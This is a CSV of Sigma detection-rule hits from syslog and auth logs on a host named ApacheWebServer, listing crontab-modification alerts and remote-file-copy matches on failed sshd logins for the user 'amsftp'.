Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18282; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=513,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18285; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=515,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18288; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=517,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18291; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=519,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18294; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=521,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18298; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=523,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:23,T1053.003,timestamp_utc=2021-12-07 10:06:23; timestamp=Dec  7 10:06:23; host=ApacheWebServer; process=crontab; pid=18301; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=525,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:23,T1053.003,timestamp_utc=2021-12-07 10:06:23; timestamp=Dec  7 10:06:23; host=ApacheWebServer; process=crontab; pid=18304; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=527,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:23,T1053.003,timestamp_utc=2021-12-07 10:06:23; timestamp=Dec  7 10:06:23; host=ApacheWebServer; process=crontab; pid=18307; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=529,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:23,T1053.003,timestamp_utc=2021-12-07 10:06:23; timestamp=Dec  7 10:06:23; host=ApacheWebServer; process=crontab; pid=18310; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=531,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:23,T1053.003,timestamp_utc=2021-12-07 10:06:23; timestamp=Dec  7 10:06:23; host=ApacheWebServer; process=crontab; pid=18313; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=533,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:24,T1053.003,timestamp_utc=2021-12-07 10:06:24; timestamp=Dec  7 10:06:24; host=ApacheWebServer; process=crontab; pid=18316; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=535,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:24,T1053.003,timestamp_utc=2021-12-07 10:06:24; timestamp=Dec  7 10:06:24; host=ApacheWebServer; process=crontab; pid=18319; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=537,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:24,T1053.003,timestamp_utc=2021-12-07 10:06:24; timestamp=Dec  7 10:06:24; host=ApacheWebServer; process=crontab; pid=18322; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=539,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:24,T1053.003,timestamp_utc=2021-12-07 10:06:24; timestamp=Dec  7 10:06:24; host=ApacheWebServer; process=crontab; pid=18325; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=541,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:25,T1053.003,timestamp_utc=2021-12-07 10:06:25; timestamp=Dec  7 10:06:25; host=ApacheWebServer; process=crontab; pid=18329; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=543,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:25,T1053.003,timestamp_utc=2021-12-07 10:06:25; timestamp=Dec  7 10:06:25; host=ApacheWebServer; process=crontab; pid=18332; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=545,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:25,T1053.003,timestamp_utc=2021-12-07 10:06:25; timestamp=Dec  7 10:06:25; host=ApacheWebServer; process=crontab; pid=18335; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=547,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:25,T1053.003,timestamp_utc=2021-12-07 10:06:25; timestamp=Dec  7 10:06:25; host=ApacheWebServer; process=crontab; pid=18339; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=549,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:25,T1053.003,timestamp_utc=2021-12-07 10:06:25; timestamp=Dec  7 10:06:25; host=ApacheWebServer; process=crontab; pid=18343; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=551,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:26,T1053.003,timestamp_utc=2021-12-07 10:06:26; timestamp=Dec  7 10:06:26; host=ApacheWebServer; process=crontab; pid=18346; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=553,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:26,T1053.003,timestamp_utc=2021-12-07 10:06:26; timestamp=Dec  7 10:06:26; host=ApacheWebServer; process=crontab; pid=18349; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=555,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:26,T1053.003,timestamp_utc=2021-12-07 10:06:26; timestamp=Dec  7 10:06:26; host=ApacheWebServer; process=crontab; pid=18352; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=557,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:26,T1053.003,timestamp_utc=2021-12-07 10:06:26; timestamp=Dec  7 10:06:26; host=ApacheWebServer; process=crontab; pid=18355; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=559,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18358; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=561,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18361; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=563,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18364; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=565,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18367; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=567,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18370; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=569,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18373; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=571,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:28,T1053.003,timestamp_utc=2021-12-07 10:06:28; timestamp=Dec  7 10:06:28; host=ApacheWebServer; process=crontab; pid=18376; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=573,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:28,T1053.003,timestamp_utc=2021-12-07 10:06:28; timestamp=Dec  7 10:06:28; host=ApacheWebServer; process=crontab; pid=18379; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=575,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:28,T1053.003,timestamp_utc=2021-12-07 10:06:28; timestamp=Dec  7 10:06:28; host=ApacheWebServer; process=crontab; pid=18384; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=578,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,,T1053.003,(further matches suppressed),Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,,T1105,"message=Breaks: cli-common (<< 0.9+nmu1), libansicolor-perl (<< 4.06), libarchive-tar...; log=/var/log/apt/eipp.log.xz; line_no=1614",Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:14,T1105,timestamp_utc=2021-11-19 22:44:14; timestamp=Nov 19 22:44:14; host=ApacheWebServer; process=sshd; pid=11817; message=Invalid user amsftp from 10.0.0.4 port 55242; log=/var/log/auth.log.3.gz; line_no=46489,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:15,T1105,timestamp_utc=2021-11-19 22:44:15; timestamp=Nov 19 22:44:15; host=ApacheWebServer; process=sshd; pid=11797; message=Invalid user amsftp from 10.0.0.4 port 55232; log=/var/log/auth.log.3.gz; line_no=46497,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:16,T1105,timestamp_utc=2021-11-19 22:44:16; timestamp=Nov 19 22:44:16; host=ApacheWebServer; process=sshd; pid=11797; message=Disconnected from invalid user amsftp 10.0.0.4 port 55232 [preauth]; log=/var/log/auth.log.3.gz; line_no=46499,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:16,T1105,timestamp_utc=2021-11-19 22:44:16; timestamp=Nov 19 22:44:16; host=ApacheWebServer; process=sshd; pid=11840; message=Invalid user amsftp from 10.0.0.4 port 55262; log=/var/log/auth.log.3.gz; line_no=46505,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:19,T1105,timestamp_utc=2021-11-19 22:44:19; timestamp=Nov 19 22:44:19; host=ApacheWebServer; process=sshd; pid=11817; message=Disconnected from invalid user amsftp 10.0.0.4 port 55242 [preauth]; log=/var/log/auth.log.3.gz; line_no=46511,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:19,T1105,timestamp_utc=2021-11-19 22:44:19; timestamp=Nov 19 22:44:19; host=ApacheWebServer; process=sshd; pid=11818; message=Invalid user amsftp from 10.0.0.4 port 55254; log=/var/log/auth.log.3.gz; line_no=46514,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:21,T1105,timestamp_utc=2021-11-19 22:44:21; timestamp=Nov 19 22:44:21; host=ApacheWebServer; process=sshd; pid=11840; message=Disconnected from invalid user amsftp 10.0.0.4 port 55262 [preauth]; log=/var/log/auth.log.3.gz; line_no=46516,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:21,T1105,timestamp_utc=2021-11-19 22:44:21; timestamp=Nov 19 22:44:21; host=ApacheWebServer; process=sshd; pid=11818; message=Disconnected from invalid user amsftp 10.0.0.4 port 55254 [preauth]; log=/var/log/auth.log.3.gz; line_no=46518,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=12005; message=Invalid user amsftp from 10.0.0.4 port 55376; log=/var/log/auth.log.3.gz; line_no=46521,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=11861; message=Invalid user amsftp from 10.0.0.4 port 55290; log=/var/log/auth.log.3.gz; line_no=46522,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=11860; message=Invalid user amsftp from 10.0.0.4 port 55284; log=/var/log/auth.log.3.gz; line_no=46523,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=11936; message=Invalid user amsftp from 10.0.0.4 port 55330; log=/var/log/auth.log.3.gz; line_no=46524,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:23,T1105,timestamp_utc=2021-11-19 22:44:23; timestamp=Nov 19 22:44:23; host=ApacheWebServer; process=sshd; pid=11921; message=Invalid user amsftp from 10.0.0.4 port 55322; log=/var/log/auth.log.3.gz; line_no=46525,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:23,T1105,timestamp_utc=2021-11-19 22:44:23; timestamp=Nov 19 22:44:23; host=ApacheWebServer; process=sshd; pid=11861; message=Disconnected from invalid user amsftp 10.0.0.4 port 55290 [preauth]; log=/var/log/auth.log.3.gz; line_no=46527,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:23,T1105,timestamp_utc=2021-11-19 22:44:23; timestamp=Nov 19 22:44:23; host=ApacheWebServer; process=sshd; pid=11913; message=Invalid user amsftp from 10.0.0.4 port 55318; log=/var/log/auth.log.3.gz; line_no=46528,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:25,T1105,timestamp_utc=2021-11-19 22:44:25; timestamp=Nov 19 22:44:25; host=ApacheWebServer; process=sshd; pid=11860; message=Disconnected from invalid user amsftp 10.0.0.4 port 55284 [preauth]; log=/var/log/auth.log.3.gz; line_no=46530,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:25,T1105,timestamp_utc=2021-11-19 22:44:25; timestamp=Nov 19 22:44:25; host=ApacheWebServer; process=sshd; pid=11974; message=Invalid user amsftp from 10.0.0.4 port 55364; log=/var/log/auth.log.3.gz; line_no=46531,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:25,T1105,timestamp_utc=2021-11-19 22:44:25; timestamp=Nov 19 22:44:25; host=ApacheWebServer; process=sshd; pid=11920; message=Invalid user amsftp from 10.0.0.4 port 55320; log=/var/log/auth.log.3.gz; line_no=46532,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:26,T1105,timestamp_utc=2021-11-19 22:44:26; timestamp=Nov 19 22:44:26; host=ApacheWebServer; process=sshd; pid=11959; message=Invalid user amsftp from 10.0.0.4 port 55334; log=/var/log/auth.log.3.gz; line_no=46534,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:26,T1105,timestamp_utc=2021-11-19 22:44:26; timestamp=Nov 19 22:44:26; host=ApacheWebServer; process=sshd; pid=11936; message=Disconnected from invalid user amsftp 10.0.0.4 port 55330 [preauth]; log=/var/log/auth.log.3.gz; line_no=46536,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:27,T1105,timestamp_utc=2021-11-19 22:44:27; timestamp=Nov 19 22:44:27; host=ApacheWebServer; process=sshd; pid=12006; message=Invalid user amsftp from 10.0.0.4 port 55394; log=/var/log/auth.log.3.gz; line_no=46538,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:28,T1105,timestamp_utc=2021-11-19 22:44:28; timestamp=Nov 19 22:44:28; host=ApacheWebServer; process=sshd; pid=11921; message=Disconnected from invalid user amsftp 10.0.0.4 port 55322 [preauth]; log=/var/log/auth.log.3.gz; line_no=46539,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:28,T1105,timestamp_utc=2021-11-19 22:44:28; timestamp=Nov 19 22:44:28; host=ApacheWebServer; process=sshd; pid=11913; message=Disconnected from invalid user amsftp 10.0.0.4 port 55318 [preauth]; log=/var/log/auth.log.3.gz; line_no=46541,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:28,T1105,timestamp_utc=2021-11-19 22:44:28; timestamp=Nov 19 22:44:28; host=ApacheWebServer; process=sshd; pid=12005; message=Disconnected from invalid user amsftp 10.0.0.4 port 55376 [preauth]; log=/var/log/auth.log.3.gz; line_no=46542,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
